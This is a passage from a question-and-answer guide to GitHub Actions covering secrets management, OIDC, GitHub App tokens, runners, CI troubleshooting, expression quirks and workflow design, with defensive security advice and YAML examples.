- Add `.github/workflows/` and `.github/actions/` to CODEOWNERS, owned by a platform or security team, and require code owner review in rulesets.
- Use rulesets to block direct pushes to the default branch.
- Use push rulesets (where available) to restrict who can change files under `.github/workflows`.
- Run workflow linters (`actionlint`, `zizmor`) as required checks.
- Remember that `GITHUB_TOKEN` can't change workflow files at all, and other tokens need the `workflows` permission to do it. Don't give that permission to automation that doesn't need it.

## 383: How do you handle secret rotation for workflows?

The best answer is to need fewer long-lived secrets: use OIDC for cloud providers, trusted publishing for npm and PyPI, and GitHub App tokens (which expire after an hour) instead of personal tokens.

For secrets that remain:

- Keep a list of each secret, its owner, where it's used and when it was last rotated.
- Rotate on a schedule, and right away when someone with access leaves or a leak is suspected.
- Script the rotation: create a new key in the provider, update the GitHub secret with `gh secret set` or the API, verify, then revoke the old key.
- Use secret scanning with push protection to catch secrets committed by mistake.

## 384: How do you use an external secret manager from Actions?

Authenticate to the manager with OIDC, read the secrets at run time, and mask them.

```yaml
permissions:
  id-token: write
  contents: read

steps:
  - uses: hashicorp/vault-action@v3
    with:
      url: https://vault.example.com
      method: jwt
      role: ci-deploy
      secrets: |
        secret/data/prod/db password | DB_PASSWORD
  - run: ./migrate.sh # DB_PASSWORD is set as env and masked
```

AWS Secrets Manager, Azure Key Vault and Google Secret Manager work the same way after their OIDC login action. This keeps secrets in one place with its own access policies, audit logs and rotation, and GitHub only stores the role name.

## 385: How do you use a GitHub App for automation across repositories?

1. Create a GitHub App with only the permissions needed (for example, `contents: write` and `pull_requests: write`).
2. Install it on the organization, limited to the target repositories.
3. Store the App ID as a variable and the private key as a secret (or better, in a protected environment).
4. Create short-lived installation tokens in workflows with `actions/create-github-app-token`, scoped to just the repositories that step needs.

App tokens expire after an hour, aren't tied to a person, show up as the bot in history, and their events can trigger workflows. That makes them the right choice for bots that open pull requests in other repositories, sync files, or push release commits that must trigger CI.

## 386: How do you trigger a workflow in another repository and wait for the result?

Send a `workflow_dispatch` (or `repository_dispatch`) with an App token that has `actions: write` on the target repository, then find the run and wait for it.

```yaml
- run: |
    gh workflow run integration.yml -R my-org/e2e-suite -f version="$VERSION" -f request_id="$REQ"
    sleep 10
    run_id=$(gh run list -R my-org/e2e-suite --workflow integration.yml \
      --json databaseId,displayTitle --jq ".[] | select(.displayTitle | contains(\"$REQ\")) | .databaseId" | head -1)
    gh run watch "$run_id" -R my-org/e2e-suite --exit-status
  env:
    GH_TOKEN: ${{ steps.app-token.outputs.token }}
    VERSION: ${{ github.sha }}
    REQ: req-${{ github.run_id }}-${{ github.run_attempt }}
```

The target workflow uses `run-name` with the `request_id` input, so the caller can find its own run. Waiting keeps a runner busy, so for long downstream jobs it's often better to have the target repository report back with a commit status or check instead.

## 387: How long is GITHUB_TOKEN valid?

It expires when the job finishes, or after 24 hours at most. For a GitHub-hosted job that's never a problem, since jobs are limited to 6 hours. For long self-hosted jobs, the token can expire before the job ends.

GitHub App installation tokens expire after 1 hour, so jobs longer than that must request a new one before calling the API again. OIDC tokens and the cloud credentials they produce also have short lifetimes (often 1 hour by default), which you can raise within the cloud provider's limits, or refresh by calling the login action again.

## 388: What organization-level Actions settings would you set?

- **Allowed actions**: GitHub-created and an approved list, with SHA pinning required.
- **Default workflow permissions**: read-only `GITHUB_TOKEN`.
- **Allow GitHub Actions to create and approve pull requests**: off, unless a specific need exists.
- **Fork pull request workflows**: require approval for outside contributors; for private repositories, don't send secrets or write tokens to fork workflows.
- **Artifact and log retention**: shorter than the 90 day default if you don't need them.
- **Runner groups**: limit sensitive runners to specific repositories and workflows.
- **OIDC subject template**: include the claims your cloud policies use.

Enterprise owners can set many of these as policies that organizations can't override.

## 389: How do you audit how Actions is used in an organization?

- **Audit log**: shows changes to workflows settings, secrets (created, updated, removed, but not values), runners, environments and approvals. Stream it to your SIEM.
- **Actions usage metrics** in organization Insights: which workflows, repositories and runners use the most minutes, and failure rates.
- **Code search** across the organization for `uses:` lines, to find every usage of a given action or version.
- **Security tools**: CodeQL for the `actions` language or `zizmor` on all repositories to find risky patterns.
- **Billing usage report**: per repository and runner type costs.

## 390: How do you control Actions spending?

- Set budgets for Actions in the billing settings, at the enterprise, organization or cost center level, with alerts, and decide whether to stop usage when the budget is hit.
- Use the usage report to find the most expensive repositories and workflows, and fix those first.
- Put larger runners behind runner groups so only approved repositories can use them.
- Set short retention for artifacts and logs to cut storage costs.
- Review macOS usage, which has the highest per-minute price.

Prices have changed several times (GitHub lowered hosted runner prices in 2026), so check current pricing before doing cost comparisons with self-hosted runners.

## 391: How do you choose between larger hosted runners and self-hosted runners?

**Larger hosted runners**: no maintenance, clean VMs, fast to set up, static IPs and private networking available. You pay per minute, and some special hardware isn't available.

**Self-hosted runners**: you choose hardware and location, can reach private networks easily, and can be cheaper at high usage. But you pay for idle capacity and for the people who run, patch, secure and autoscale them.

A simple rule: start with hosted runners. Move to self-hosted when you have a clear reason (special hardware, private network access, cost at scale) and the team to run them properly, usually with ARC and ephemeral runners.

## 392: How do you run GPU workloads in GitHub Actions?

GitHub offers GPU larger runners (Linux with NVIDIA GPUs) on Team and Enterprise plans. You create them in the organization runner settings and target them by name. They're expensive per minute, so use them only for jobs that really need a GPU, like model tests, and set tight timeouts.

The other option is self-hosted GPU runners, for example ARC on a Kubernetes cluster with GPU nodes, with a separate scale set for GPU jobs so normal jobs don't take those nodes.

Keep GPU jobs small: run the GPU part only, and do installs and preparation on cheaper runners, passing results through artifacts.

## 393: How can GitHub-hosted runners reach private resources in your cloud?

- **Azure private networking**: larger runners (and on some plans, standard ones) can be placed in an Azure virtual network you own, so they reach private resources and use your network security rules. In 2026 GitHub added failover networks (in preview) for regional outages.
- **Static IP ranges**: larger runners can get fixed public IPs that you add to firewall allow lists.
- **OIDC plus a cloud API**: for many tasks you don't need network access to private hosts, only access to cloud APIs, which work over the internet with OIDC credentials.
- **Self-hosted runners** inside the private network.

Avoid opening private resources to all GitHub IP ranges. Those ranges are shared by every GitHub customer.

## 394: When do you need static IP addresses for runners, and how do you get them?

You need them when a system only accepts connections from known IPs, like a database firewall, a partner API or an on-premises service.

Standard GitHub-hosted runners use dynamic IPs from large shared ranges. Larger runners can be set up with static IP addresses (a small fixed range assigned to your runners), which you then add to the allow list. Self-hosted runners behind a NAT gateway with a fixed IP are the other option.

Allow-listing GitHub's published Actions IP ranges isn't a real security control, since any GitHub user's workflow can come from them.

## 395: How do you access a private database from a workflow securely?

Options, from most to least preferred for production:

1. Don't. Run migrations and admin tasks from inside the private network (a Kubernetes job or a self-hosted runner there), triggered by the workflow.
2. Use runners in the private network (self-hosted, or hosted runners with Azure private networking).
3. Use a temporary, identity-based tunnel, like a cloud bastion or session manager, with credentials from OIDC.
4. Use a mesh VPN that the job joins with short-lived credentials.

Avoid making the database public with IP allow lists for hosted runner ranges. And always use short-lived database credentials, scoped to what the job needs.

## 396: How would you structure CI/CD for a repository with many microservices?

- One `changes` job to detect which services changed (including shared libraries they depend on).
- A dynamic matrix to build and test only those services, with a reusable workflow per service type.
- Images built once, tagged with the commit SHA and pushed by digest.
- Deploys per service with their own environments and concurrency groups, so one service's deploy doesn't block another.
- One aggregate required check that passes when all needed jobs pass or are skipped.
- Contract or integration tests that run when the API of a shared service changes.

Keep per-service config (paths, image names, deploy targets) in a small file per service, so adding a service doesn't require editing the workflows.

## 397: Pull request CI takes 40 minutes. How would you get it down to 10?

1. **Measure**: look at the step timings in a few runs. Find where the time goes: setup, install, build, tests, waiting.
2. **Cancel and skip**: add `concurrency` with `cancel-in-progress`, skip unaffected parts in a monorepo.
3. **Cache**: dependency cache, build tool cache, Docker layer cache.
4. **Parallelize**: split lint, typecheck and tests into parallel jobs, and shard the test suite based on timing data.
5. **Fix the slowest tests**: often a few tests (with real sleeps or heavy setup) take a large share of the time.
6. **Bigger machines**: larger runners for CPU-bound builds and tests.
7. **Move slow suites**: run full E2E in the merge queue or after merge, and keep a fast smoke set on pull requests.

Track the p90 time after each change to see what actually helped.

## 398: Jobs fail with "No space left on device". What do you do?

Hosted runners have limited free disk space, and big Docker builds, large dependency trees or ML models can fill it.

- Remove large preinstalled tools you don't need at the start of the job:

```yaml
- run: |
    sudo rm -rf /usr/share/dotnet /usr/local/lib/android /opt/ghc /opt/hostedtoolcache/CodeQL
    sudo docker image prune --all --force
    df -h
```

- Clean up between steps: delete build intermediates, prune Docker build cache.
- Don't download everything: use sparse checkout and skip LFS files.
- Use a larger runner with a bigger disk.
- On self-hosted runners, add monitoring and regular cleanup of the workspace and Docker data.

Print `df -h` at a few points to see which step eats the space.

## 399: The cache never seems to hit. How do you debug it?

Check the cache step's log and the Caches page:

- **Key changes every run**: the key includes something like `github.sha`, a timestamp, or a hash of files that change during the build. Print the key and compare across runs.
- **Wrong scope**: the cache was saved on another feature branch. Make sure `main` creates it.
- **Never saved**: the job failed or was cancelled before the post step (the default `actions/cache` only saves on success), or the key already existed. Use `actions/cache/save` with `if: always()` if needed.
- **Path mismatch**: the saved path differs from the restored path (different OS, home folder or working directory). Paths must match exactly, and Windows paths differ.
- **Evicted**: the repository is over the size limit, so entries get deleted quickly.
- **Different version**: caches are tied to compression method and path, so changes in `actions/cache` versions or `path` create a new cache version.

## 400: A workflow didn't trigger at all. How do you find out why?

Go through this list:

- Is the workflow file on the right branch? `push` and `pull_request` use the file from the commit; `schedule`, `workflow_dispatch` (by default), `workflow_run`, `issue_comment` and `pull_request_target` use the default branch.
- Do the branch, tag and path filters match? Remember `pull_request` branch filters check the target branch.
- Was the event created with `GITHUB_TOKEN`? Then it doesn't trigger workflows.
- Is there a YAML error? The Actions tab shows invalid workflow files.
- Is the workflow disabled, or are Actions disabled for the repository or by organization policy?
- Does the pull request have merge conflicts? Then `pull_request` workflows don't run.
- Did the commit message contain `[skip ci]`?
- For forks, is the run waiting for approval?
- For `workflow_run`, does the `workflows` name match the other workflow's `name` exactly?

## 401: You renamed a job and now pull requests are blocked waiting for a check. What happened?

Required status checks are matched by name. After the rename, the old check name is still required in the ruleset or branch protection, but no job reports it anymore, so every pull request shows "Expected, waiting for status to be reported".

Fix it by updating the required checks to the new name. To avoid this in the future, require only one stable aggregate job (like `ci-ok`) that depends on the others, so renaming or adding jobs and matrix entries doesn't touch branch protection. The same thing happens when you change matrix values, because they're part of the check name.

## 402: Secrets are empty in a pull request workflow. Why?

Common reasons:

- The pull request comes from a fork. Secrets are not passed to `pull_request` runs from forks.
- The pull request was opened by Dependabot. Only Dependabot secrets are available.
- The secret is on an environment, but the job doesn't use that environment.
- The secret name is wrong. A missing secret evaluates to an empty string, without any error.
- In a reusable workflow, the caller didn't pass the secret (and didn't use `secrets: inherit`).
- The organization secret isn't shared with this repository.

Add a check that fails early with a clear message:

```yaml
- run: |
    if [ -z "$API_KEY" ]; then echo "::error::API_KEY is not set"; exit 1; fi
  env:
    API_KEY: ${{ secrets.API_KEY }}
```

## 403: Two deploys to production ran at the same time. How do you prevent it?

That means there was no concurrency control, or the groups didn't match. Check:

- Is `concurrency` set on the deploy job, with a group that's the same for every run that deploys to production, like `deploy-production`? A group with `${{ github.ref }}` in it would allow a branch deploy and a tag deploy to overlap.
- Do different workflows (a manual deploy and an automatic one) deploy to the same target? They need to share the same group name, because concurrency groups work across workflows in the repository.
- Is `cancel-in-progress` false, so a running deploy isn't killed halfway?

For deploys from different repositories to the same target, GitHub concurrency can't help, so use a lock in the deploy tool or the target system.

## 404: A scheduled workflow stopped running. What could be the cause?

- It's a public repository with no activity for 60 days, so GitHub disabled the scheduled workflow. Re-enable it in the Actions tab.
- The cron line was changed on a branch but not on the default branch.
- The workflow file has a syntax error since a recent change.
- The workflow or Actions was disabled for the repository, or the repository was archived.
- The default branch was renamed and the file isn't on the new default branch.
- Runs are happening but late. Scheduled runs can be delayed under heavy load, especially at the top of the hour.

If a scheduled job is important, alert when it hasn't succeeded within the expected window, instead of only alerting on failure.

## 405: A step fails with "Resource not accessible by integration". What does it mean?

The token used for the API call doesn't have the needed permission. With `GITHUB_TOKEN` this usually means:

- `permissions` doesn't include the scope (for example, commenting needs `pull-requests: write` or `issues: write`).
- The run is from a fork or Dependabot, where the token is read-only.
- The repository or organization default is restricted, and the workflow didn't ask for more.
- The resource is in another repository, which `GITHUB_TOKEN` can't access.
- The action is something `GITHUB_TOKEN` can't do at all, like changing workflow files or some organization settings.

Look at the "Set up job" step to see the token's actual permissions, and compare with the API endpoint's documented requirements.

## 406: A third-party action you use was compromised. What do you do?

1. **Find usage**: search the organization's code for the action name, including in composite actions and reusable workflows.
2. **Stop the bleeding**: block the action in the organization's allowed actions settings, or pin to a known good SHA, and disable affected workflows if needed.
3. **Check exposure**: find runs that used the bad version during the affected window (logs, audit log). For public repositories, check if secrets appear in logs, and delete those logs.
4. **Rotate secrets** that were available to those jobs, including cloud keys, npm tokens and App private keys. Revoke any tokens that might have been taken.
5. **Look for follow-up damage**: new releases, pushed tags, changed packages, unusual cloud activity.
6. **Prevent repeats**: SHA pinning everywhere, fewer secrets per job, OIDC, egress restrictions and Dependabot with a review step.

## 407: A job hangs until it hits the timeout. How do you find out why?

- Look at which step was running and the last output lines. Turn on debug logging and re-run.
- Common causes: a command waiting for input (like a prompt from `npm`, `apt` or `git`), a test runner in watch mode, a server started in the foreground instead of the background, a deadlock in tests, waiting on a service that never becomes ready, or a network call without a timeout.
- Set `CI=true` (already set on runners), use non-interactive flags (`-y`, `--yes`, `DEBIAN_FRONTEND=noninteractive`), and add timeouts to network calls.
- Add `timeout-minutes` to the step so you find out sooner, and print progress in long loops.
- Use the debug shell approach (tmate) carefully if you can't reproduce it locally.

## 408: Tests pass locally but fail in CI. How do you approach it?

Look for differences between the two environments:

- **Versions**: Node.js, package versions (lock file not used locally?), OS and browser versions.
- **Environment**: missing environment variables, different time zone (runners use UTC), different locale, `CI=true` changing tool behavior.
- **File system**: case-sensitive file names on Linux, line endings on Windows, files that exist locally but aren't committed or are in `.gitignore`.
- **Resources**: fewer CPUs and less memory, so timing-based tests and parallel workers behave differently.
- **Order and state**: tests that depend on each other's data, or on a local database with leftover data.
- **Network**: services that are reachable from your laptop but not from the runner.

Running the tests in the same container image as CI, or with `act`, usually reveals the difference quickly.

## 409: How would you migrate a project from Jenkins or another CI tool to GitHub Actions?

1. **Inventory**: list all pipelines, triggers, credentials, plugins, agents and what each one deploys.
2. **Map concepts**: stages to jobs, agents to runners, credentials to secrets or OIDC, shared libraries to reusable workflows and composite actions.
3. **Use the importer** to get a first draft and an estimate of the work.
4. **Migrate in small parts**: start with CI for one repository, run both systems in parallel for a while and compare results.
5. **Improve while moving**: replace long-lived keys with OIDC, add environments with approvals, pin actions.
6. **Plan the runners**: hosted where possible, self-hosted for private network needs.
7. **Turn off the old pipeline** once the new one has run reliably for some time.

Don't try to copy every old behavior exactly. Some old plugins are better replaced by simpler native features.

## 410: What is GitHub Actions Importer?

It's a GitHub CLI extension that helps move pipelines from other CI tools to GitHub Actions. It supports Azure DevOps, Bamboo, Bitbucket Pipelines, CircleCI, GitLab, Jenkins and Travis CI.

```bash
gh extension install github/gh-actions-importer
gh actions-importer audit jenkins --output-dir audit
gh actions-importer dry-run jenkins --source-url https://jenkins.example.com/job/app --output-dir out
gh actions-importer migrate jenkins --source-url https://jenkins.example.com/job/app \
  --target-url https://github.com/my-org/app --output-dir out
```

`audit` shows what can be converted automatically and what needs manual work. `migrate` opens a pull request with the converted workflow. Expect to review and fix the output; it gets you most of the way, not all of it.

## 411: Jobs for self-hosted runners stay queued forever. What do you check?

- **Labels**: do all labels in `runs-on` exist on at least one online runner? A typo in a label means no runner matches. (Queued jobs are cancelled after 24 hours.)
- **Runner group access**: is the repository (and the workflow, if restricted) allowed to use the runner group?
- **Runner status**: are the runners online and idle in the settings page, or busy, offline or too old to receive jobs?
- **Autoscaling**: for ARC, check the listener and controller logs, the max runners setting, and whether pods are stuck in Pending because the cluster has no capacity or can't pull the image.
- **Organization policy**: some organizations restrict self-hosted runners for public or forked repositories.

## 412: Builds fail with Docker Hub rate limit errors. How do you fix it?

Docker Hub limits pulls for anonymous users per IP, and hosted runners share IPs with many users.

- Log in to Docker Hub before pulling, even for public images, with a token stored as a secret. Authenticated users have much higher limits.
- Use images from other registries where available (`ghcr.io`, `public.ecr.aws`, `mcr.microsoft.com`), or copy the base images you use into your own registry.
- Use a pull-through cache (for self-hosted runners) or a registry mirror.
- Reduce pulls: cache layers with Buildx and avoid pulling the same image in every job.

```yaml
- uses: docker/login-action@v3
  with:
    username: ${{ vars.DOCKERHUB_USERNAME }}
    password: ${{ secrets.DOCKERHUB_TOKEN }}
```

Service containers and job containers can also pass `credentials` for Docker Hub.

## 413: How do you report a workflow_run result back to the pull request?

The `workflow_run` workflow isn't attached to the pull request, so its result doesn't appear there automatically. You report it yourself:

- **Commit status**: call the statuses API on the pull request head SHA (`github.event.workflow_run.head_sha`), with `statuses: write`.
- **Check run**: create a check run with the checks API, with `checks: write`, including a summary and annotations.
- **Comment**: post or update a comment on the pull request.

```yaml
- run: |
    gh api repos/${{ github.repository }}/statuses/"$SHA" \
      -f state=success -f context="coverage" \
      -f description="Coverage 87%" -f target_url="$RUN_URL"
  env:
    GH_TOKEN: ${{ github.token }}
    SHA: ${{ github.event.workflow_run.head_sha }}
    RUN_URL: ${{ github.server_url }}/${{ github.repository }}/actions/runs/${{ github.run_id }}
```

Then this status can be made a required check.

## 414: How do you create a check run with annotations through the API?

Use the checks API with a token that has `checks: write`. Each annotation points to a file and line range.

```yaml
- uses: actions/github-script@v8
  with:
    script: |
      await github.rest.checks.create({
        owner: context.repo.owner,
        repo: context.repo.repo,
        name: 'License check',
        head_sha: context.payload.pull_request.head.sha,
        status: 'completed',
        conclusion: 'failure',
        output: {
          title: '1 file without license header',
          summary: 'All source files must start with the license header.',
          annotations: [{
            path: 'src/server.ts',
            start_line: 1,
            end_line: 1,
            annotation_level: 'failure',
            message: 'Missing license header',
          }],
        },
      });
```

A single request can include up to 50 annotations, so for more you update the check run in batches. For simple cases, printing `::error file=...` commands is easier.

## 415: How can you add a manual approval in the middle of a pipeline?

The built-in way is an environment with required reviewers on the job that needs approval. The run pauses at that job until a reviewer approves or rejects it.

Things to know:

- The waiting job doesn't use a runner while it waits.
- A run can wait up to 30 days for approval before it fails.
- Reviewers can leave a comment, which is stored with the deployment.
- If you want approval without secrets, create an environment with only the reviewer rule.

Some teams use issue-based approval actions (the workflow opens an issue and waits for an "approve" comment), but those keep a runner busy while waiting and are easier to get wrong. Environments are the better choice.

## 416: How do environments work in reusable workflows?

The `environment` is set on the job inside the reusable workflow, often from an input. The environment's secrets are resolved when that job starts, from the caller's repository environments.

```yaml
# called workflow
on:
  workflow_call:
    inputs:
      environment:
        type: string
        required: true

jobs:
  deploy:
    runs-on: ubuntu-latest
    environment: ${{ inputs.environment }}
    steps:
      - run: ./deploy.sh
        env:
          TOKEN: ${{ secrets.DEPLOY_TOKEN }}
```

The caller must still pass `secrets: inherit` (or the named secret) for repository and organization secrets. Environment secrets of the caller's repository become available because the job uses that environment. Protection rules apply as usual.

## 417: How do token permissions work between a caller and a reusable workflow?

The caller job sets the maximum `GITHUB_TOKEN` permissions. The reusable workflow can keep them or lower them, but it can't raise them.

```yaml
# caller
jobs:
  release:
    permissions:
      contents: write
      id-token: write
    uses: my-org/workflows/.github/workflows/release.yml@v2
```

If the called workflow declares `permissions` that are higher than what the caller gives, the run fails. So the caller must grant everything the reusable workflow needs, which is also a good way to make its access visible in the calling repository. Document the required permissions in the reusable workflow's README.

## 418: How do comparisons and type conversion work in expressions?

When the two sides of `==` or `!=` have different types, GitHub converts them to numbers:

- `null` becomes `0`, `true` becomes `1`, `false` becomes `0`.
- A string is parsed as a number if it's a valid number, an empty string becomes `0`, anything else becomes `NaN`.
- Arrays and objects are only equal if they're the same instance.

String comparisons are not case sensitive, so `'Main' == 'main'` is true.

Surprising results:

```yaml
${{ '' == 0 }}         # true
${{ 'true' == true }}  # false ('true' becomes NaN, NaN is never equal)
${{ '1' == true }}     # true
```

This is why string outputs like `'true'` should be compared with the string `'true'`.

## 419: What are the gotchas with boolean inputs?

- In `workflow_dispatch` and `workflow_call`, `inputs.flag` is a real boolean, so `if: inputs.flag` works.
- But `github.event.inputs.flag` (the old way) is a **string**, `'true'` or `'false'`, and `if: github.event.inputs.flag` is true for both, because a non-empty string is truthy.
- On events without inputs (like `push`), `inputs.flag` is empty, which counts as false.
- Job and step outputs are always strings, so passing a boolean through them turns it into `'true'`/`'false'`.

```yaml
if: inputs.deploy # boolean, correct
if: github.event.inputs.deploy == 'true' # string comparison, correct
if: needs.check.outputs.deploy == 'true' # outputs are strings
```

Use `fromJSON()` to turn a `'true'` or `'false'` string back into a boolean when you need one.

## 420: Why is this if condition always true: if: ${{ inputs.env }} == 'prod'?

Because only part of the value is inside `${{ }}`. GitHub replaces the expression and gets a string like `staging == 'prod'`, which is a non-empty string, and a non-empty string is truthy.

```yaml
if: ${{ inputs.env }} == 'prod' # wrong, always true
if: ${{ inputs.env == 'prod' }} # correct
if: inputs.env == 'prod' # correct
```

The rule: in `if`, either write the whole expression without `${{ }}`, or put the whole expression inside it. `actionlint` warns about this mistake.

## 421: How does github.ref differ between events?

| Event                 | `github.ref`          | `github.sha`                  |
| --------------------- | --------------------- | ----------------------------- |
| `push` to branch      | `refs/heads/<branch>` | pushed commit                 |
| `push` of tag         | `refs/tags/<tag>`     | tagged commit                 |
| `pull_request`        | `refs/pull/<n>/merge` | merge commit                  |
| `pull_request_target` | default branch ref    | last commit on default branch |
| `workflow_dispatch`   | branch or tag chosen  | its latest commit             |
| `schedule`            | default branch        | its latest commit             |
| `release`             | `refs/tags/<tag>`     | tagged commit                 |
| `workflow_run`        | default branch        | its latest commit             |

Code that checks `github.ref == 'refs/heads/main'` therefore behaves differently per event. In `workflow_run`, use `github.event.workflow_run.head_branch` and `head_sha` to know what the first workflow ran on.

## 422: What are github.head_ref, github.base_ref and github.ref_name?

- `github.head_ref`: the source branch of a pull request (like `feature/login`). Only set for `pull_request` and `pull_request_target`.
- `github.base_ref`: the target branch of a pull request (like `main`). Also only set for pull request events.
- `github.ref_name`: the short name of `github.ref`. For pull requests it's `<number>/merge`, not the branch name.

A common concurrency group uses `github.head_ref || github.ref`, so pull requests group by branch and pushes by ref:

```yaml
concurrency:
  group: ${{ github.workflow }}-${{ github.head_ref || github.ref }}
  cancel-in-progress: true
```

`head_ref` is a branch name chosen by the pull request author, so treat it as untrusted input in scripts.

## 423: How did pull_request_target change in late 2025?

GitHub changed `pull_request_target` so the workflow is always taken from the repository's **default branch**, even for pull requests that target another branch. Before, the workflow file came from the pull request's base branch, which could be an old release branch with an outdated and possibly vulnerable workflow.

Effects:

- Fixes to a `pull_request_target` workflow apply right away once they're on the default branch.
- Branch filters for this event only work as expected if the workflow on the default branch has them.
- `GITHUB_REF` and `GITHUB_SHA` for this event point to the default branch.

If you have release branches with different `pull_request_target` logic, you have to move that logic into the default branch version with conditions on `github.base_ref`.

## 424: How do you avoid infinite loops in workflows that push commits?

- Push with `GITHUB_TOKEN` when the commit doesn't need to trigger CI, because those pushes don't start new runs.
- If you push with an App token (which does trigger workflows), add guards:
  - Skip when the actor is your bot: `if: github.actor != 'my-release-bot[bot]'`.
  - Skip when nothing changed (`git diff --quiet`), so no commit is made.
  - Use `paths-ignore` for files the bot writes, like `CHANGELOG.md`.
  - Add `[skip ci]` to bot commit messages when the commit doesn't need checks.
- For workflows triggered by labels or comments that themselves add labels or comments, check the event's actor and type.

Also set `concurrency` so a loop can't start many runs in parallel while you notice it.

## 425: Can you keep a secret away from other steps in the same job?

Only partly. Passing a secret through step-level `env` means other steps don't get it as an environment variable. But all steps in a job run on the same machine as the same user, so:

- A malicious step can read files written by other steps, and inspect processes started by them.
- The runner process memory holds the secrets sent to the job, and a step with enough rights can read it (this was how the tj-actions compromise exposed secrets).

So the job, not the step, is the real security boundary. If a step runs untrusted code (installs, third-party actions), and another step needs a sensitive secret, put them in **separate jobs**, and pass only the needed artifacts between them.

## 426: What is zizmor and how does it help?

`zizmor` is an open source static analysis tool for GitHub Actions workflows that focuses on security. It finds problems like:

- template injection in `run` blocks with untrusted data
- dangerous triggers like `pull_request_target` combined with checkout of pull request code
- excessive `permissions` or missing `permissions`
- actions not pinned to SHAs, or pinned to a known vulnerable version
- `persist-credentials` left on when artifacts are uploaded
- cache poisoning risks in release workflows

```bash
zizmor .github/workflows/
```

It can output SARIF, so you can upload the results to code scanning and see them in pull requests. Use it together with `actionlint`, which focuses more on correctness.

## 427: How do you test changes to a workflow before merging them?

- Most `pull_request` workflow changes run on the pull request itself, so you see the result right away.
- For `workflow_dispatch` workflows, run the branch version with `gh workflow run file.yml --ref my-branch` (the workflow must already exist on the default branch).
- For `schedule`, `workflow_run`, `pull_request_target` and `issue_comment`, which use the default branch version, temporarily add `workflow_dispatch` or `push` on your branch to try the logic, or test in a fork or a sandbox repository.
- For reusable workflows, call them at `@my-branch` from a test repository.
- Run `act` and `actionlint` locally for faster loops.

Avoid testing deploy workflows against real production. Point them at a test environment through inputs.

## 428: How do you keep action versions up to date across many repositories?

- Enable Dependabot for `github-actions` in every repository, ideally with **groups** so updates arrive as one pull request per week instead of many.
- Use a **cooldown** (a minimum age for new versions) so you don't pick up a malicious release in its first days.
- Or use Renovate with a shared preset across the organization, which also supports pinning to SHAs automatically and minimum release age.
- For shared reusable workflows, updating the central repository updates every consumer that follows its major tag, so fewer repositories need direct updates.

```yaml
version: 2
updates:
  - package-ecosystem: github-actions
    directory: /
    schedule:
      interval: weekly
    cooldown:
      default-days: 7
    groups:
      actions:
        patterns: ["*"]
```

## 429: How would you design CI/CD for a full stack app (frontend, backend, database)?

- **Pull requests**: one workflow with a `changes` job, then parallel jobs for web (lint, typecheck, unit tests, build), API (lint, unit tests, integration tests with a database service container and migrations) and E2E tests against the built app, plus dependency review. One aggregate required check.
- **Previews**: deploy the frontend and API for each pull request with a temporary database (or a branch of a database service), and post the URL.
- **Main**: build the web assets and API image once, attest them, deploy to staging with OIDC, run migrations, smoke tests.
- **Production**: environment approval, migrations (backward compatible), deploy the same digests, smoke tests, automatic rollback on failure.
- **Nightly**: full E2E across browsers, dependency and image scanning.

## 430: How do you handle preview environments that need a database?

Options:

- **Database branching** services (several managed Postgres providers offer it): create a branch of the staging database per pull request in seconds, with realistic data.
- **Per-preview database or schema** on a shared server: create `pr_123` and run migrations and seed data.
- **Containers** in a preview namespace on Kubernetes, created and destroyed with the preview.

Whatever you choose:

- Never use production data with personal information in previews.
- Delete the database when the pull request closes, and run a scheduled cleanup for anything missed.
- Use migrations from the pull request, so the preview tests the schema changes too.
- Keep preview credentials separate from staging and production.

## 431: How does GitHub Actions compare to GitLab CI in design?

- **Config**: GitLab uses one `.gitlab-ci.yml` with stages; GitHub Actions uses many workflow files with jobs and `needs`.
- **Reuse**: GitLab has `include`, `extends` and CI/CD components; GitHub has actions (step level) and reusable workflows (job level), plus a large Marketplace.
- **Runners**: both have hosted and self-hosted runners with tags or labels. GitLab runners support executors like Docker and Kubernetes out of the box; GitHub uses ARC for Kubernetes.
- **Events**: GitHub Actions can react to almost any GitHub event (issues, comments, releases), which makes it good for repository automation, not just CI.
- **Environments and approvals**: both support them, with different plan requirements.

The choice is usually driven by where the code lives, not by the CI features.

## 432: When would GitHub Actions not be the right tool?

- Very long or heavy batch jobs (hours of data processing), which are better in a batch system or workflow engine.
- Workloads that need strict queuing, exactly-once processing or complex retries, which are better in a job queue.
- Continuous deployment to many clusters with drift detection, where a GitOps tool (Argo CD, Flux) does better.
- Pipelines that must run in an air-gapped network without GHES.
- Very large monorepos with huge build graphs, where specialized build systems with remote execution (Bazel, Buildkite with its own agents) can be much faster.

Even then, Actions often stays as the trigger and the glue, while the heavy work runs elsewhere.

## 433: How does a merge queue change how you design CI?

With a merge queue, pull requests are tested again on top of the latest `main` (plus the entries ahead of them in the queue) before merging. This catches problems where two pull requests pass on their own but break together.

Design changes:

- Add `merge_group` to the triggers of every required workflow.
- Move slow suites (full E2E, cross-browser tests) to run only in the merge queue, and keep pull request CI fast.
- Make the jobs reliable. A flaky test in the queue removes good pull requests and slows down everyone.
- Use the queue's batching settings so several pull requests are tested together when CI is slow.

```yaml
on:
  pull_request:
  merge_group:

jobs:
  e2e:
    if: github.event_name == 'merge_group'
    runs-on: ubuntu-latest
    steps:
      - run: npm run e2e
```

## 434: How would you set up a scheduled release train with Actions?

A release train ships whatever is ready on a fixed schedule, for example every Tuesday.

```yaml
on:
  schedule:
    - cron: "0 9 * * 2"
  workflow_dispatch:

permissions:
  contents: write

jobs:
  cut-release:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v6
        with:
          fetch-depth: 0
      - run: |
          version="$(date -u +%Y.%m.%d)"
          git tag "v$version"
          git push origin "v$version"
```

Pushing the tag (with an App token, so it triggers workflows) starts the normal build and deploy pipeline, which goes through staging and the production approval. Keep `workflow_dispatch` for emergency trains, and check first that `main` is green before tagging.

## 435: How do you share one long-lived test environment between pull requests safely?

When pull requests must use a shared environment (for example, a staging system with a third-party integration), you need a lock so they don't overwrite each other.

- Use a job-level `concurrency` group named after the environment, so only one pull request deploys and tests at a time. Remember only one can wait; the others get cancelled.
- For a real queue, use a lock in an external system (a table row, a cloud lock) that the workflow acquires and releases with `if: always()`, plus a timeout so a crashed run doesn't keep the lock forever.
- Show who holds the environment, for example in a job summary or a status on the pull request.

The better long-term fix is cheap per-pull-request environments, so sharing isn't needed.

## 436: What is the difference between github.actor and github.triggering_actor?

`github.actor` is the user whose action created the original event (for example, who opened the pull request or pushed). `github.triggering_actor` is the user who started this specific run, which differs on re-runs.

